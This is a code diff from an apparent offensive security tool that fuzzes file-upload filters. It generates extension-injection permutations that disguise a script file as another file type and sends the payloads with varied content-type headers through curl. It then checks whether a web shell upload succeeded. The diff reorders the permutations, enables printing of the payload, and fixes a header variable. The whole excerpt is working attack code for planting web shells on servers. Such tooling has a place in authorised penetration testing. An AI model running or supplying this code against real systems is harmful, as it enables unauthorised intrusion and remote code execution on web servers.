@@ -131,23 +131,23 @@ def run_whitelist_bypass(json_data, curl_subprocess_list, binary_payload, arg_co
 						for other_filetype_extension in other_filetype["TYPE_EXTENSIONS"]:
 							# cycle through every character for character injection attack
 							for injection_character in json_data["CHARACTER_INJECTION_CHARACTERS"]:
-								extension_injection_list.append(fr"{injection_character}{other_filetype_extension}{script_file_extension}")
-								extension_injection_list.append(fr"{other_filetype_extension}{injection_character}{script_file_extension}")
+								extension_injection_list.append(fr"{injection_character}{script_file_extension}{other_filetype_extension}")
 								extension_injection_list.append(fr"{script_file_extension}{injection_character}{other_filetype_extension}")
-								extension_injection_list.append(fr"{script_file_extension}{other_filetype_extension}{injection_character}")
+								extension_injection_list.append(fr"{other_filetype_extension}{injection_character}{script_file_extension}")
+								extension_injection_list.append(fr"{other_filetype_extension}{script_file_extension}{injection_character}")
 						# fuzz for each extension while iterating though each header type
 						for content_type in other_filetype["TYPE_CONTENT_HEADERS"]:
 							for extension in extension_injection_list:
 								print(F"Extension: {extension}, Header: {content_type}")
 								binary_file_output = process_text(binary_payload, json_data, content_type, extension)
 								binary_file_output = binary_file_output.encode('utf-8')
-								# print(binary_file_output)
+								print(binary_file_output)
 								# send web request
 								curl_response = subprocess.run(processed_curl, input=binary_file_output, capture_output=True, text=False)
 								print(curl_response.stdout)
 								# # process confirm cURL to confirm file upload and print output:
 								if arg_confirm:
-									confirmed_output = confirm_file_upload(json_data['WEBSHELL_TEST'], json_data, header, extension)
+									confirmed_output = confirm_file_upload(json_data['WEBSHELL_TEST'], json_data, content_type, extension)
 									print(confirmed_output)
 						
 		
